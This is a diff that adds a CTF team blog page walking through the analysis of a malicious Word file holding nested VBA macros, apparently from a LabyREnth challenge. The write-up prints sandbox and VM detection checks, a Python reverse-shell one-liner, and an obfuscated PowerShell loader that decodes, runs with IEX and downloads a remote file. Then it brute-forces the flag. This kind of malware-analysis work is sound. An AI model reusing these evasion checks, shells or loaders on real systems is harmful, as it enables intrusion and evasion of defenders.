@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+       &middot; Rot26
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="page">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Rot26
+      </a>
+    </div>
+    <p class="lead"></p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/BreizhCTF.html">BreizhCTF</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/Hacklu.html">Hacklu</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/LabyREnth.html">LabyREnth</a>
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  <h1>Members</h1>
+<a href="https://twitter.com/Memoi2001">Fooker</a>
+<a href="https://twitter.com/kalimer0x00">Kalimer0x00</a>
+<a href="https://twitter.com/govlog">Govlog</a>
+<a href="https://twitter.com/maxencedun">Sp4rKy</a>
+
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+  
+</div>
+
+    <main class="container">
+      <div class="content">
+  <p>Once again, we get a doc file, called “macroses.doc”, which (should) say a lot about its content …</p>
+
+<p>However :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>macroses.doc: ASCII text, with CRLF, LF line terminators
+</code></pre></div></div>
+
+<p>And indeed, the file contains something which looks like a mail attachment.</p>
+
+<h1 id="the-mail">The mail</h1>
+
+<p>Just extract the content :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ripmime <span class="nt">-i</span> macroses.doc
+</code></pre></div></div>
+
+<p>We end with:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asdfdalasdfasd: ASCII text, with CRLF line terminators
+danger.htm:     ASCII text, with CRLF line terminators
+textfile0:      empty
+</code></pre></div></div>
+
+<p>if you look carefully the content of macroses.doc, you will notice that the
+third part has no <code class="highlighter-rouge">Content-Location</code> header so the file has not been extracted.
+Keep it for later.</p>
+
+<p><code class="highlighter-rouge">danger.htm</code> only contains:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">Edit-Time-Data</span> <span class="na">href=</span><span class="s">"asdfdalasdfasd"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>So it seems most interesting file is <code class="highlighter-rouge">asdfdalasdfasd</code>.</p>
+
+<h2 id="asdfdalasdfasd">asdfdalasdfasd</h2>
+
+<p>First extract it :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dos2unix asdfdalasdfasd
+<span class="nv">$ </span>base64 <span class="nt">-d</span> asdfdalasdfasd <span class="o">&gt;</span> asdfdalasdfasd.raw
+<span class="nv">$ </span>file asdfdalasdfasd.raw
+asdfdalasdfasd.raw: Data
+</code></pre></div></div>
+
+<p>And sadly, the content of <code class="highlighter-rouge">.raw</code> file is unreadable, except the first few chars : “ActiveMime”. Running binwalk gives us some clue :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk asdfdalasdfasd.raw
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+50            0x32            Zlib compressed data, default compression
+</code></pre></div></div>
+
+<p>So we extract the content and get a file called <code class="highlighter-rouge">32</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>32: Composite Document File V2 Document, Cannot read section info
+</code></pre></div></div>
+
+<p>Seems corrupted, but at least we have some info. As we are now used to extracting macro, just check :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>olevba 32
+olevba 0.51.1dev1 - http://decalage.info/python/oletools
+Flags        Filename
+<span class="nt">-----------</span>  <span class="nt">-----------------------------------------------------------------</span>
+OLE:MASI-B-- 32
+<span class="o">===============================================================================</span>
+FILE: 32
+Type: OLE
+<span class="nt">-------------------------------------------------------------------------------</span>
+VBA MACRO ThisDocument.cls
+<span class="k">in </span>file: 32 - OLE stream: u<span class="s1">'VBA/ThisDocument'</span>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Sub ViewVBCode<span class="o">()</span>
+    NONONONONONONONONONONONO
+End Sub
+
+Sub FileTemplates<span class="o">()</span>
+    NONONONONONONONONONONONO
+End Sub
+
+Sub ToolsMacro<span class="o">()</span>
+    NONONONONONONONONONONONO
+End Sub
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<p>Nice, a macro !</p>
+
+<h1 id="first-macro">First macro</h1>
+
+<p>So , this macro contains a basic anti-debug function :</p>
+
+<pre><code class="language-vbnet">Sub NONONONONONONONONONONONO()
+    CallByName ActiveDocument, "SaveAs2", VbMethod, ActiveDocument.Path &amp; "\\" &amp; ActiveDocument.Name, 4
+    ActiveDocument.Close wdDoNotSaveChanges
+End Sub
+</code></pre>
+
+<p>This method is called in a few places :</p>
+
+<pre><code class="language-vbnet">Sub ViewVBCode()
+    NONONONONONONONONONONONO
+End Sub
+
+Sub FileTemplates()
+    NONONONONONONONONONONONO
+End Sub
+
+Sub ToolsMacro()
+    NONONONONONONONONONONONO
+End Sub
+</code></pre>
+
+<p>and in the <code class="highlighter-rouge">Main()</code>:</p>
+
+<pre><code class="language-vbnet">    d = False
+
+    If WordBasic.AppCount() &lt; 50 Then
+        d = True
+    End If
+
+    tns = Array("vmware", "vmtools", "vbox", "process explorer", "processhacker", "procmon", "visual basic", "fiddler", "wireshark")
+    bns = Array("virtualbox", "vmware")
+    Set ws = GetObject("winmgmts:\\.\root\cimv2")
+
+    Dim names() As String
+    ReDim names(WordBasic.AppCount())
+    WordBasic.AppGetNames names
+    For Each n In names
+        For Each tn In tns
+            If InStr(LCase(n), tn) &gt; 0 Then
+                d = True
+            End If
+        Next
+    Next
+
+    Set qis = ws.ExecQuery("Select * from Win32_Processor", , 48)
+    For Each i In qis
+            If i.NumberOfCores &lt; 3 Then
+                d = True
+            End If
+    Next
+
+    Set qis = ws.ExecQuery("Select * from Win32_Bios", , 48)
+    For Each i In qis
+        For Each bn In bns
+            If InStr(LCase(i.SMBIOSBIOSVersion), bn) &gt; 0 Then
+                d = True
+            End If
+            If InStr(LCase(i.SerialNumber), bn) &gt; 0 Then
+                d = True
+            End If
+        Next
+    Next
+
+    Set qis = ws.ExecQuery("Select * from Win32_ComputerSystem", , 48)
+    For Each i In qis
+        If i.partOfDomain Then
+            d = True
+        End If
+    Next
+
+    If d Then
+        NONONONONONONONONONONONO
+        Exit Sub
+    End If
+</code></pre>
+
+<p>So we can just skip all this stuff.</p>
+
+<h2 id="real-payload">Real payload</h2>
+
+<p>So the interesting stuff is mostly:</p>
+
+<pre><code class="language-vbnet">   offy = iffyoffy
+
+    payload_size = 78508
+    b64 = Replace(supersuper(offy), vbLf, "")
+    b64 = Left(b64, payload_size)
+
+    Dim rawlobster() As Byte
+    rawlobster = bbbbb(b64)
+    rawf = ActiveDocument.Path &amp; "\\as8ja8sj3d.doc"
+    FF = FreeFile
+    Open rawf For Binary Access Write As #FF
+
+    Put #FF, 1, rawlobster
+    Close #FF
+    Application.Documents.Open rawf
+</code></pre>
+
+<pre><code class="language-vbnet">Function supersuper(iffy) As String
+On Error Resume Next
+   fp = ActiveDocument.Path &amp; "\\" &amp; ActiveDocument.Name
+   Dim data As String
+   Dim FF As Integer
+   FF = FreeFile
+    Open fp For Input As #FF
+
+    Seek FF, iffy + 1
+    supersuper = Input$(LOF(FF) - iffy, FF)
+    Close 1
+End Function
+
+Function iffyoffy() As Long
+    iffyoffy = ((CInt(Left(WordBasic.[GetSystemInfo$](25), 2)) \ 50) * 500) + ((WordBasic.[GetSystemInfo$](31) \ 768) * 1337) + ((WordBa
+sic.[GetSystemInfo$](32) \ 1366) * 81175)
+End Function
+</code></pre>
+
+<p>So what it does is basically that it opens the current file remove the <code class="highlighter-rouge">offy</code>
+ first chars, and send the 78508 next chars to <code class="highlighter-rouge">bbbbb()</code>:</p>
+
+<pre><code class="language-vbnet">Private Function bbbbb(ByVal snakes As String) As Variant
+    On Error Resume Next
+    Set oo = CreateObject("MSXML2.DOMDocument")
+    Set xx = oo.createElement("b64")
+    xx.dataType = "bin.base64"
+    xx.Text = snakes
+    bbbb = xx.nodeTypedValue
+
+    k = Asc(Mid(WordBasic.[GetSystemInfo$](30), 10, 1)) Xor Asc(Mid(WordBasic.[GetSystemInfo$](30), 17, 1))
+
+    Dim pppp(58880) As Byte
+    For iter = 0 To 58880
+        pppp(iter) = bbbb(iter) Xor k
+    Next
+    bbbbb = pppp
+End Function
+</code></pre>
+
+<p>Well, it just xor the whole base64 decoded result with one value, should be easy to find.
+The text must be part of this 2nd base64 bloc we had at the end of
+<code class="highlighter-rouge">macroses.doc</code>. Sadly, we don’t really know which value iffyoffy will give us.</p>
+
+<p>Also, there is a <code class="highlighter-rouge">digisdigis</code> function which seems to do nothing except
+concatenate some random chars not used anywhere else.</p>
+
+<h1 id="2nd-file">2nd file</h1>
+
+<p>So, let’s try to extract something that can be decoded as base64. We know it must be 78508 bytes long, so :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dd <span class="nv">skip</span><span class="o">=</span>19294 <span class="nv">bs</span><span class="o">=</span>1 <span class="k">if</span><span class="o">=</span>macroses.doc  |tr <span class="nt">-d</span> <span class="s1">'\n'</span> |base64 <span class="nt">-d</span>
+base64: invalid input
+</code></pre></div></div>
+
+<p>19556 is the offset to the beggining of this last base64 huge block. It does
+not decode correctly as base64. Let’s try with a bigger offset:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dd <span class="nv">skip</span><span class="o">=</span>19295 <span class="nv">bs</span><span class="o">=</span>1 <span class="k">if</span><span class="o">=</span>macroses.doc  |tr <span class="nt">-d</span> <span class="s1">'\n'</span> |LC_ALL<span class="o">=</span>C base64 <span class="nt">-d</span>  <span class="o">&gt;</span> as8ja8sj3d.doc.xored
+</code></pre></div></div>
+
+<p>w00t, worked. Not too bad. Now the xor part.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mkdir unxored
+<span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="k">$(</span>seq 1 255<span class="k">)</span><span class="p">;</span> <span class="k">do </span>xortool-xor <span class="nt">-h</span> <span class="k">$(</span><span class="nb">printf</span> <span class="s2">"%02x"</span> <span class="nv">$i</span><span class="k">)</span> <span class="nt">-f</span> as8ja8sj3d.doc.xored <span class="o">&gt;</span> unxored/as8ja8sj3d.doc.<span class="k">${</span><span class="nv">i</span><span class="k">}</span>.unxored <span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>Looking at the result of the <code class="highlighter-rouge">file</code> command, we don’t see anything really interesting (except a wrongly detected zlib).
+Data must be there … So try harder with binwalk, I finally found:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk unxored/as8ja8sj3d.doc.6.unxored
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+52636         0xCD9C          Zip archive data, at least v2.0 to extract, compressed size: 255, uncompressed size: 540, name: <span class="o">[</span>Content_Types].xml
+52940         0xCECC          Zip archive data, at least v2.0 to extract, compressed size: 192, uncompressed size: 310, name: _rels/.rels
+53173         0xCFB5          Zip archive data, at least v2.0 to extract, compressed size: 131, uncompressed size: 138, name: theme/theme/themeManager.xml
+53362         0xD072          Zip archive data, at least v2.0 to extract, compressed size: 1704, uncompressed size: 7076, name: theme/theme/theme1.xml
+55118         0xD74E          Zip archive data, at least v2.0 to extract, compressed size: 182, uncompressed size: 283, name: theme/theme/_rels/themeManager.xml.rels
+55718         0xD9A6          End of Zip archive
+55740         0xD9BC          XML document, version: <span class="s2">"1.0"</span>
+</code></pre></div></div>
+
+<p>And even better with hachoir :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hachoir-subfile unxored/as8ja8sj3d.doc.6.unxored
+
+<span class="o">[</span>+] Start search on 106483 bytes <span class="o">(</span>104.0 KB<span class="o">)</span>
+
+<span class="o">[</span>+] File at 46602 <span class="nv">size</span><span class="o">=</span>58880 <span class="o">(</span>57.5 KB<span class="o">)</span>: Microsoft Office document <span class="o">=&gt;</span> out/file-0001.doc
+<span class="o">[</span>+] File at 52636 <span class="nv">size</span><span class="o">=</span>3104 <span class="o">(</span>3104 bytes<span class="o">)</span>: ZIP archive <span class="o">=&gt;</span> out/file-0002.zip
+
+<span class="o">[</span>+] End of search <span class="nt">--</span> <span class="nv">offset</span><span class="o">=</span>106483 <span class="o">(</span>104.0 KB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>So we just got a new doc file :</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>out/file-0001.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: Windows User, Template: Normal.dotm, Last Saved By: Windows User, Revision Number: 10, Name of Creating Application: Microsoft Office Word, Total Editing Time: 02:46:00, Create Time/Date: Sat Mar 11 14:37:00 2017, Last Saved Time/Date: Fri May 12 18:49:00 2017, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0out/file-0001.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: Windows User, Template: Normal.dotm, Last Saved By: Windows User, Revision Number: 10, Name of Creating Application: Microsoft Office Word, Total Editing Time: 02:46:00, Create Time/Date: Sat Mar 11 14:37:00 2017, Last Saved Time/Date: Fri May 12 18:49:00 2017, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0
+</code></pre></div></div>
+
+<h1 id="second-macro">Second macro</h1>
+
+<p>So, here we go again :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>olevba <span class="nt">-c</span> file-0001.doc <span class="o">&gt;</span> file-0001.macro.vbs
+</code></pre></div></div>
+
+<p>What do we have in this macro :</p>
+
+<ul>
+  <li>a reverse shell</li>
+</ul>
+
+<pre><code class="language-vbnet">Sub C64()
+    On Error Resume Next
+    Err.Clear
+    scriptToRun = "do shell script ""python -c 'import urllib2,socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\""http://reversing.sg/fl4g.txt\"",80)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"",\""-i\""]);' &amp;"""
+    res = MacScript(scriptToRun)
+End Sub
+</code></pre>
+
+<ul>
+  <li>Some base64 encoded gzip stuff :</li>
+</ul>
+
+<pre><code class="language-vbnet">   lStr = lStr &amp; "powershell -ep bypass -C ""$data = [System.Convert]::FromBase64String('H4sIAAAAAAAEAEWPYUvDMBCGvwv+h1EKS8DFoU5wozBsN+eQFZ1MaGehS88ZSRNIb12z0f9u0KEf733ufY7zj1kvawOfpK/QIJsorguhtu/DYV5xIdgD4BKNS0gaalWDQYemRpf3eQW3NyfWzWcvfR7p+ul6LotyZfmV3CV2cEjsXbSa6Dopm08392H2HHQppaPzM/+oWey1QfoYs0gY4KiNdXJ3MdwZAwr/UvK7vybjbEwv28A7ddcfMt8ybNBznCxg34s3X67SWdoKoWQLQPYGm1AKZ6Ms0nsldV5MhQTi/zx+0fnX0tE31FlVnA0BAAA=');$ms=New-Object System.IO.MemoryStream;$"
+   lStr = lStr &amp; "ms.Write($data,0,$data.Length);$ms.Seek(0,0)|Out-Null;$cs = New-Object System.IO.Compression.GZipStr"
+   lStr = lStr &amp; "eam($ms,[System.IO.Compression.CompressionMode]::Decompress);$sr=New-Object System.IO.StreamReader($"
+   lStr = lStr &amp; "cs);$t=$sr.readtoend();IEX $t;"""
+</code></pre>
+
+<p>The base64 string, once decoded &amp; unzipped is :</p>
+
+<pre><code class="language-vbnet">${^-^}=$([Text.Encoding]::ascii.GetString([Convert]::FromBase64String('aHR0cDovL3JldmVyc2luZy5zZy9DVEovZmxhZy50eHQ=')));
+${o.O"}=[IO.Directory]::GetCurrentDirectory();
+${\(@^@)/}="${o.O"}\flag.txt";
+(New-Object System.Net.WebClient).DownloadFile(${^-^}, ${\(@^@)/});
+</code></pre>
+
+<p>Oh, maybe the flag :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span><span class="nv">aHR0cDovL3JldmVyc2luZy5zZy9DVEovZmxhZy50eHQ</span><span class="o">=</span> |base64 <span class="nt">-d</span>
+http://reversing.sg/CTJ/flag.txt
+
+<span class="nv">$ </span>curl http://reversing.sg/CTJ/flag.txt <span class="nt">-L</span>
+75
+</code></pre></div></div>
+
+<p>No, of course not … that would have been way too easy :/</p>
+
+<ul>
+  <li>
+    <p>A crypto function <code class="highlighter-rouge">ourseahorse()</code> which seems to build an array from a key, then xor the message with this array.</p>
+  </li>
+  <li>
+    <p>a request to http://enablemacroses.com , which returns ‘TheFileIsCorrupted \x0A”, which is used as key (yes, you must take the whole answer, including \x0A).</p>
+  </li>
+  <li>
+    <p>a comparison between a call to <code class="highlighter-rouge">ourseahorse()</code> and the expected result</p>
+  </li>
+</ul>
+
+<p>So likely we need to find the sMessage which matchs the message. 2 ways here,
+either reverse the algorithm or bruteforce it. Let’s try to BF :)</p>
+
+<h2 id="bf-the-flag">BF the flag</h2>
+
+<p>I felt too lazy to move this algorithm to python, so just write the small BF part we need in VB.</p>
+
+<p>So here is my bf.vbs:</p>
+
+<pre><code class="language-vbnet">Option VBASupport 1
+Private Const logFileAddress = "/tmp/flag.log"
+
+Sub Main
+bf()
+End Sub
+
+Sub Logg(Optional sMessage As String)
+    Dim f1 As Integer
+
+    if IsMissing(sMessage)  then ' delete all log data
+    if FileExists(logFileAddress)  then Kill logFileAddress
+    Exit Sub
+    end if
+
+    f1 = FreeFile
+    Open logFileAddress For Append As #f1
+    print #f1, Now &amp; " : " &amp; sMessage
+    Close #f1
+End Sub
+
+Function ourseahorse(sMessage, strKey)
+    Dim kLen, x, y, i, j, temp
+    Dim s(256), k(256)
+    kLen = Len(strKey)
+    For i = 0 To 255
+        s(i) = i
+        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1))
+    Next
+    j = 0
+    For i = 0 To 255
+        j = (j + k(i) + s(i)) Mod 256
+        temp = s(i)
+        s(i) = s(j)
+        s(j) = temp
+    Next
+    x = 0
+    y = 0
+    For i = 1 To 3072
+        x = (x + 1) Mod 256
+        y = (y + s(x)) Mod 256
+        temp = s(x)
+        s(x) = s(y)
+        s(y) = temp
+    Next
+    For i = 1 To Len(sMessage)
+        x = (x + 1) Mod 256
+        y = (y + s(x)) Mod 256
+        temp = s(x)
+        s(x) = s(y)
+        s(y) = temp
+
+        ourseahorse = ourseahorse &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; ","
+    Next
+End Function
+
+Private Sub BF()
+    Dim oXMLHTTP As Object
+    Dim sPageHTML  As String
+    Dim sURL As String
+
+    sKey = "TheFileIsCorrupted " &amp; Chr(10)
+    expected=Split("111,84,77,89,203,150,116,89,197,72,226,100,165,245,146,10,32,226,162,246,203,54,22,38,170,176,140,251,246,148,213,97,164,250,125,242,13,162,250,33,239,104,38,74,167,183,133,3,72,255,131,105,228,81,164,202,212,207,231,172,100,156,197,237,45,87,182,196,77",",")
+    Dim res(69) As String
+
+    For g = 0 To 68
+      For k = 0 To 255
+         res(g) = Chr(k)
+         sMessage = Join(res,"")
+         x = ourseahorse(sMessage, sKey)
+         got = Split(x, ",")
+
+         If got(g) = expected(g) Then
+           Exit For
+         End If
+      Next
+      Logg(Join(res,""))
+    Next
+    r = Join(res,"")
+    If x = y Then
+        MsgBox "Gratz"
+    Else
+        MsgBox "Try harder"
+    End If
+End Sub
+</code></pre>
+
+<p>Just run bf() function on Loffice macro, and watch your <code class="highlighter-rouge">/tmp/flag.log</code>:</p>
+
+<pre><code class="language-vbnet">tail -f /tmp/flag.log
+26/07/2017 15:49:26 : P
+26/07/2017 15:49:30 : PA
+26/07/2017 15:49:36 : PAN
+26/07/2017 15:49:44 : PAN{
+26/07/2017 15:49:47 : PAN{6
+26/07/2017 15:49:51 : PAN{68
+26/07/2017 15:49:54 : PAN{681
+26/07/2017 15:50:00 : PAN{681e
+26/07/2017 15:50:07 : PAN{681eb
+26/07/2017 15:50:13 : PAN{681ebc
+26/07/2017 15:50:16 : PAN{681ebc6
+26/07/2017 15:50:22 : PAN{681ebc6c
+26/07/2017 15:50:26 : PAN{681ebc6c7
+26/07/2017 15:50:29 : PAN{681ebc6c79
+[...]
+</code></pre>
+
+<p>and after a few minutes you get your flag \o/</p>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+  </body>
+</html>
